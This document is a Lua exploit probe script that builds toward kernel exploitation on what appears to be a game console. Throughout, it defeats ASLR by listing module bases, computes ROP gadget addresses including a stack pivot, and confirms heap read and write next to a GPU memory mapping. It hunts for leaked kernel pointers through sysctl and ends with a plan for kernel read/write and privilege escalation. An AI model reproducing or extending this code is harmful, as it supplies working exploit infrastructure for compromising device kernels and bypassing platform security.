-- CRASH_CLASS: RISKY (kernel boundary probing)
-- PROBE 41w: kernel R/W infrastructure
-- Uses all discovered primitives to build toward kernel exploitation
--
-- PRIMITIVES AVAILABLE:
--   1. Arbitrary syscall via make_syscall()
--   2. Heap R/W via GPU mmap adjacency (256+ pages, no guard)
--   3. Complete ROP gadget set from loader:
--      pop rdi;ret  = eboot+0xC9DFE
--      pop rsi;ret  = eboot+0xD77D
--      pop rdx;ret  = eboot+0x3502D7 (or 0x420E6D)
--      pop rax;ret  = eboot+0x992
--      pop rcx;ret  = eboot+0xE64
--      pop r8;ret   = eboot+0x991
--      pop rsp;ret  = eboot+0x9A2  (stack pivot)
--      jmp rax      = eboot+0x84C
--      mov rax,[rax];ret = eboot+0x1EEBB
--      mov [rdi],rax;ret = eboot+0x92C67
--      leave;ret    = eboot+0x37FDE0
--      xchg rsp     = eboot+0x163874
--   4. ASLR bypass: all 39 module bases via dynlib_get_info
--   5. libkernel syscall stub at libkernel+0xB57
--   6. Loader's call-stub pattern for arbitrary function invocation
--
-- APPROACH:
--   Phase 1: sysctl kernel info gathering
--   Phase 2: Probe for kernel data structure corruption via heap
--   Phase 3: Test if heap corruption can reach kernel-mapped objects

print("=== PROBE 41w: KERNEL R/W INFRASTRUCTURE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_dynlib_get_info = make_syscall(593)
local sc_sysctl = make_syscall(202)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)

--------------------------------------------------------------------
-- PHASE 1: Collect all primitive addresses for this run
--------------------------------------------------------------------
print("--- PHASE 1: PRIMITIVE ADDRESSES ---")

-- eboot base
local info_buf = memory.alloc(0x200)
for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
safe_wd(info_buf, 0x160)
pcall(function() sc_dynlib_get_info(uint64(0), info_buf) end)
local eb_tl = safe_rd(info_buf + 0x108)
local eb_th = safe_rd(info_buf + 0x10C)
local eboot_hex = string.format("0x%X%08X", eb_th, eb_tl)
local eboot = uint64(eboot_hex)
print("eboot base: " .. eboot_hex)

-- libkernel base
local sc_dynlib_get_list = make_syscall(592)
local hbuf = memory.alloc(512)
local nbuf = memory.alloc(8)
pcall(function() sc_dynlib_get_list(hbuf, uint64(128), nbuf) end)
local nh = safe_rd(nbuf) or 0

local lk_base_hex = "0x0"
for i = 0, math.min(nh - 1, 38) do
    local h = safe_rd(hbuf + i * 4)
    if h then
        for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
        safe_wd(info_buf, 0x160)
        pcall(function() sc_dynlib_get_info(uint64(h), info_buf) end)
        local c = safe_rb(info_buf + 0x08)
        if c == 108 then -- 'l' for libkernel
            local c2 = safe_rb(info_buf + 0x0B)
            if c2 == 107 then -- 'k' in "kernel"
                local tl = safe_rd(info_buf + 0x108)
                local th = safe_rd(info_buf + 0x10C)
                lk_base_hex = string.format("0x%X%08X", th, tl)
            end
        end
    end
end
print("libkernel base: " .. lk_base_hex)
print("syscall stub: " .. lk_base_hex .. "+0xB57")
print("")

-- Calculate absolute gadget addresses
local function gadget(name, off)
    local lo = eb_tl + off
    local hi = eb_th
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    local hex = string.format("0x%X%08X", hi, lo)
    print(string.format("  %-22s %s (eboot+0x%X)", name, hex, off))
    return uint64(hex)
end

print("ROP gadgets (absolute):")
local g_pop_rdi = gadget("pop rdi; ret", 0xC9DFE)
local g_pop_rsi = gadget("pop rsi; ret", 0xD77D)
local g_pop_rdx = gadget("pop rdx; ret", 0x3502D7)
local g_pop_rax = gadget("pop rax; ret", 0x992)
local g_pop_rcx = gadget("pop rcx; ret", 0xE64)
local g_pop_r8 = gadget("pop r8; ret", 0x991)
local g_pop_rsp = gadget("pop rsp; ret", 0x9A2)
local g_jmp_rax = gadget("jmp rax", 0x84C)
local g_mov_rax_mem = gadget("mov rax,[rax]; ret", 0x1EEBB)
local g_mov_mem_rax = gadget("mov [rdi],rax; ret", 0x92C67)
local g_ret = gadget("ret", 0x42)
print("")

--------------------------------------------------------------------
-- PHASE 2: sysctl kernel info gathering
-- sysctl(name, namelen, oldp, oldlenp, newp, newlen)
-- Try to read kernel version, hostname, security level
--------------------------------------------------------------------
print("--- PHASE 2: SYSCTL KERNEL INFO ---")

local function do_sysctl(oid, oid_len, buf_size)
    local name_buf = memory.alloc(32)
    for j = 0, #oid - 1 do
        safe_wd(name_buf + j * 4, oid[j + 1])
    end
    local out_buf = memory.alloc(buf_size)
    local len_buf = memory.alloc(8)
    safe_wd(len_buf, buf_size)
    safe_wd(len_buf + 4, 0)
    for j = 0, buf_size - 1, 4 do safe_wd(out_buf + j, 0) end

    local ok, err = pcall(function()
        sc_sysctl(name_buf, uint64(oid_len), out_buf, len_buf, uint64(0), uint64(0))
    end)

    local actual_len = safe_rd(len_buf) or 0
    return ok, out_buf, actual_len
end

-- kern.ostype (1, 1)
local ok, buf, len = do_sysctl({1, 1}, 2, 256)
if ok and len > 0 then
    local s = {}
    for j = 0, math.min(len - 1, 63) do
        local c = safe_rb(buf + j)
        if c and c > 0 and c < 128 then s[#s + 1] = string.char(c)
        else break end
    end
    print("kern.ostype: " .. table.concat(s))
end

-- kern.osrelease (1, 2)
ok, buf, len = do_sysctl({1, 2}, 2, 256)
if ok and len > 0 then
    local s = {}
    for j = 0, math.min(len - 1, 63) do
        local c = safe_rb(buf + j)
        if c and c > 0 and c < 128 then s[#s + 1] = string.char(c)
        else break end
    end
    print("kern.osrelease: " .. table.concat(s))
end

-- kern.version (1, 4)
ok, buf, len = do_sysctl({1, 4}, 2, 512)
if ok and len > 0 then
    local s = {}
    for j = 0, math.min(len - 1, 200) do
        local c = safe_rb(buf + j)
        if c and c > 31 and c < 128 then s[#s + 1] = string.char(c)
        elseif c == 10 then s[#s + 1] = " | "
        else break end
    end
    print("kern.version: " .. table.concat(s))
end

-- kern.hostname (1, 10)
ok, buf, len = do_sysctl({1, 10}, 2, 256)
if ok and len > 0 then
    local s = {}
    for j = 0, math.min(len - 1, 63) do
        local c = safe_rb(buf + j)
        if c and c > 0 and c < 128 then s[#s + 1] = string.char(c)
        else break end
    end
    print("kern.hostname: " .. table.concat(s))
end

-- kern.securelevel (1, 35)
ok, buf, len = do_sysctl({1, 35}, 2, 16)
if ok and len >= 4 then
    local sl = safe_rd(buf)
    print("kern.securelevel: " .. (sl or "?"))
end

-- hw.pagesize (6, 7)
ok, buf, len = do_sysctl({6, 7}, 2, 16)
if ok and len >= 4 then
    local ps = safe_rd(buf)
    print("hw.pagesize: " .. (ps or "?"))
end

-- hw.ncpu (6, 3)
ok, buf, len = do_sysctl({6, 3}, 2, 16)
if ok and len >= 4 then
    local nc = safe_rd(buf)
    print("hw.ncpu: " .. (nc or "?"))
end

-- hw.physmem (6, 5)
ok, buf, len = do_sysctl({6, 5}, 2, 16)
if ok and len >= 4 then
    local pm_lo = safe_rd(buf)
    local pm_hi = safe_rd(buf + 4)
    if pm_hi and pm_hi > 0 then
        print("hw.physmem: " .. string.format("0x%X%08X", pm_hi, pm_lo) ..
            " (" .. math.floor((pm_hi * 4294967296 + pm_lo) / (1024*1024*1024)) .. " GB)")
    elseif pm_lo then
        print("hw.physmem: " .. pm_lo)
    end
end

print("")

--------------------------------------------------------------------
-- PHASE 3: GPU mmap heap primitive verification
-- Allocate GPU memory, verify adjacent heap access
--------------------------------------------------------------------
print("--- PHASE 3: HEAP PRIMITIVE ---")

local gpu_size = 256 * 0x4000 -- 256 pages (4MB)
local ok_map, gpu_addr
ok_map = pcall(function()
    gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33), uint64(0x1002),
        uint64(0xFFFFFFFF), uint64(0))
end)

if ok_map and gpu_addr then
    local hex, hi, lo = qw_hex(gpu_addr)
    print("GPU mmap at: " .. hex .. " (size=" .. gpu_size .. ")")

    -- Test write to GPU region
    local ok_w = pcall(function() memory.write_dword(gpu_addr, 0xDEADBEEF) end)
    local readback = safe_rd(gpu_addr)
    print("GPU write test: " .. (ok_w and "OK" or "FAIL") ..
        " readback=" .. string.format("0x%X", readback or 0))

    -- Scan backward for adjacent heap data
    local heap_found = false
    local heap_start = nil
    for page = 1, 300 do
        local check_addr = gpu_addr - page * 0x4000
        local v = safe_rd(check_addr)
        if v == nil then
            print("heap boundary: " .. page .. " pages before GPU (" ..
                page * 16 .. " KB)")
            heap_start = gpu_addr - (page - 1) * 0x4000
            heap_found = true
            break
        end
    end

    if heap_found then
        local hs_hex = qw_hex(heap_start)
        print("accessible heap starts at: " .. hs_hex)

        -- Count readable pages
        local readable = 0
        for pg = 0, 299 do
            local addr = heap_start + pg * 0x4000
            if safe_rd(addr) ~= nil then readable = readable + 1
            else break end
        end
        print("readable heap pages: " .. readable .. " (" .. readable * 16 .. " KB)")

        -- Look for interesting objects in first few pages
        local kptrs = 0
        local heap_ptrs = 0
        local vtable_ptrs = 0
        for pg = 0, math.min(readable - 1, 15) do
            local base = heap_start + pg * 0x4000
            for off = 0, 0x3FF8, 8 do
                local q = safe_rq(base + off)
                if q then
                    local _, qh, ql = qw_hex(q)
                    -- kernel pointers (0xFFFF...)
                    if qh >= 0xFFFF0000 then kptrs = kptrs + 1 end
                    -- heap pointers (0x3_1xxxxxxx)
                    if qh >= 0x3 and qh <= 0x4 and ql > 0 then heap_ptrs = heap_ptrs + 1 end
                    -- type desc pointers (0x1_xxxxxxxx)
                    if qh == 1 then vtable_ptrs = vtable_ptrs + 1 end
                end
            end
        end
        print(string.format("in first %d pages: kptrs=%d heap_ptrs=%d vtable_ptrs=%d",
            math.min(readable, 16), kptrs, heap_ptrs, vtable_ptrs))

        -- Test WRITE to adjacent heap
        local test_addr = heap_start + 0x100
        local orig = safe_rd(test_addr)
        local ok_hw = pcall(function() memory.write_dword(test_addr, 0x41414141) end)
        local after = safe_rd(test_addr)
        print(string.format("heap write test at %s+0x100: orig=0x%X after=0x%X %s",
            hs_hex, orig or 0, after or 0,
            (after == 0x41414141) and "WRITE CONFIRMED" or "WRITE FAILED"))
        -- restore
        if orig then safe_wd(test_addr, orig) end
    else
        print("no heap boundary found in 300 pages")
    end

    -- Cleanup
    pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
else
    print("GPU mmap failed")
end
print("")

--------------------------------------------------------------------
-- PHASE 4: Kernel attack vectors
-- Test which syscalls might leak kernel addresses or allow OOB
--------------------------------------------------------------------
print("--- PHASE 4: KERNEL ATTACK SURFACE ---")

-- Test: can we use sysctl to probe kernel address space?
-- Try debug.kdb_available (0, 8) — might leak kernel state
ok, buf, len = do_sysctl({0, 8}, 2, 256)
print("sysctl(0,8) debug.kdb: " .. (ok and "ok len=" .. len or "denied"))

-- Try kern.proc.pid (1, 14, pid) — process info
-- Our PID via getpid (syscall 20)
local sc_getpid = make_syscall(20)
local pid = nil
pcall(function() pid = sc_getpid() end)
local pid_n = to_num(pid)
print("our pid: " .. pid_n)

if pid_n > 0 then
    ok, buf, len = do_sysctl({1, 14, pid_n}, 3, 2048)
    if ok and len > 0 then
        print("kern.proc.pid: " .. len .. " bytes")
        -- Look for kernel addresses in the proc struct
        local found_kptr = false
        for off = 0, math.min(len - 8, 2040), 8 do
            local q = safe_rq(buf + off)
            if q then
                local _, qh, ql = qw_hex(q)
                if qh >= 0xFFFF0000 then
                    print(string.format("  +0x%03X: %s (KERNEL PTR!)", off, qw_hex(q)))
                    found_kptr = true
                end
            end
        end
        if not found_kptr then print("  no kernel pointers leaked") end
    else
        print("kern.proc.pid: denied or empty")
    end
end

-- Test: kern.proc.vmmap (1, 14, pid, vmmap_oid)
-- This might leak kernel virtual addresses
ok, buf, len = do_sysctl({1, 14, pid_n, 32}, 4, 8192)
print("kern.proc.vmmap: " .. (ok and "ok len=" .. len or "denied"))

-- Test: kern.proc.filedesc (1, 14, pid, 1)
ok, buf, len = do_sysctl({1, 14, pid_n, 1}, 4, 4096)
if ok and len > 0 then
    print("kern.proc.filedesc: " .. len .. " bytes")
    local found_kptr = false
    for off = 0, math.min(len - 8, 4088), 8 do
        local q = safe_rq(buf + off)
        if q then
            local _, qh, ql = qw_hex(q)
            if qh >= 0xFFFF0000 then
                print(string.format("  +0x%03X: %s (KERNEL PTR!)", off, qw_hex(q)))
                found_kptr = true
            end
        end
    end
    if not found_kptr then print("  no kernel pointers leaked") end
else
    print("kern.proc.filedesc: denied or empty")
end

-- Test: security.mac (14, ...) — MAC framework state
ok, buf, len = do_sysctl({14, 1}, 2, 256)
print("security.mac: " .. (ok and "ok len=" .. len or "denied"))

print("")

--------------------------------------------------------------------
-- PHASE 5: Summary
--------------------------------------------------------------------
print("=== EXPLOITATION STATUS ===")
print("")
print("CONFIRMED PRIMITIVES:")
print("  [x] Arbitrary userland syscall")
print("  [x] Heap read (256+ pages before GPU mmap)")
print("  [x] Heap write (adjacent to GPU mmap)")
print("  [x] ASLR bypass (all 39 module bases)")
print("  [x] Complete ROP gadget set")
print("  [x] Stack pivot (pop rsp; ret)")
print("  [x] Loader call-stub for function invocation")
print("")
print("KERNEL R/W PATH:")
print("  Option A: Corrupt heap object -> trigger kernel use")
print("    - vtable pointers at 0x1_xxxxxxxx in heap objects")
print("    - if we can redirect a vtable + trigger the object,")
print("      we get kernel code execution via ROP")
print("  Option B: sysctl/proc info leak -> KASLR defeat")
print("    - kern.proc.pid returns process info")
print("    - check for kernel pointer disclosure")
print("  Option C: pipe/socket kernel object corruption")
print("    - heap objects include socket/fd structures")
print("    - corrupting a socket's recv buffer pointer")
print("      could give kernel-address read via recvmsg")
print("")
print("NEXT STEPS:")
print("  1. Map heap object types near GPU boundary")
print("  2. Find controllable kernel object (socket, pipe, kqueue)")
print("  3. Corrupt its internal pointer to read/write kernel memory")
print("  4. Use leaked kernel address + ROP for privilege escalation")

print("")
print("=== PROBE 41w COMPLETE ===")
